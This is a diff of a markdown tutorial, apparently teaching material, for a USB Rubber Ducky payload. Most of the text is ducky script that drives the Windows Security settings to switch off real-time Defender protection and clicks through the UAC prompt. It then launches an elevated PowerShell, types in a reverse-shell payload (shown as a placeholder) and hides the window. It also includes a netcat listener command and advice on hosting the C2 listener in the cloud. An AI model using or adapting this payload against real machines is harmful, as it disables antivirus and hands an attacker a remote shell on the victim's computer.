@@ -52,9 +52,8 @@ nc -lnvp 5757
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_143100.png)
 
-## Note
-
-It reminded to have the C2 listener on a cloud machine, so you don't have to worry about network problems.
+> It reminded to have the C2 listener on a cloud machine, so you don't have to worry about network problems.\
+> The computers must be on the same network. Or host the listener on the cloud. 
 
 # What Happen When We Ran The Basic Payload.
 
@@ -75,7 +74,7 @@ Extension in ducky script is just a fast way to import something in the Payload 
 
 > To learn more about Extension https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/extensions
 
-```duckyscript
+```bat
 EXTENSION DETECT_READY
  REM VERSION 1.1
  REM AUTHOR: Korben
@@ -109,7 +108,7 @@ This extension will automatically launch the payload when the computer is ready.
 
 ## Navigate GUI to disable windows Defender settings
 
-```duckyscript
+```bat
 REM Open Windows Defender Settings
 CTRL ESC
 DELAY 750
@@ -125,7 +124,7 @@ ENTER
 3. Press Enter to open the windows security.
 4. Press Enter again to go from home to Virus & threat protection.
 
-```duckyscript
+```bat
 REM Navigate to Manage Settings
 DELAY 500
 TAB
@@ -146,7 +145,7 @@ So, this part will move from the Quick Scan button to manage settings under righ
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_125337.png)
 
-```duckyscript
+```bat
 REM Open and turn off Realtime Protection
 SPACE
 DELAY 1000
@@ -162,7 +161,7 @@ When this happens, the UAC will active and ask for yes or no. `ALT + y` will hit
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_125409_500x412.png)
 
-```duckyscript
+```bat
 REM Exit security settings
 ALT F4
 DELAY 500
@@ -170,7 +169,7 @@ DELAY 500
 
 This will just close the Windows security tab.
 
-```duckyscript
+```bat
 REM Open elevated PowerShell
 GUI r
 DELAY 500
@@ -186,7 +185,7 @@ DELAY 1000
 3. `Ctrl + shift + Enter` when in the run prompt will open as admin
 4. hit yes in the UAC to launch PowerShell.
 
-```duckyscript
+```bat
 REM Enter reverse shell and hides the terminal
 STRINGLN <RevShell payload>
 DELAY 200
@@ -194,16 +193,12 @@ GUI DOWNARROW
 ```
 
 > Note: don't forget to change the `<RevShell Payload>` to the PowerShell #1 from the RevShell Site (don't forget about the IP).
+> You will most likely have to play with the delay if it does run right.
+> This payload will take about 25 seconds or more, if you have to change the delay for slower computers.
 
 # Generate and putting it on the ducky.
 
 [Intro ducky class](../Rubber-Ducky-Intro/README.md#generate-payload-and-getting-it-on-the-ducky)
-
-# Notes
-
-- You will most likely have to play with the delay if it does run right.
-- The computers must be on the same network. Or host the listener on the cloud. 
-- This payload will take about 25 seconds or more, if you have to change the delay for slower computers.
 
 # Reference Link
 - Payload IDE(Integrated development environment): https://payloadstudio.hak5.org/community/
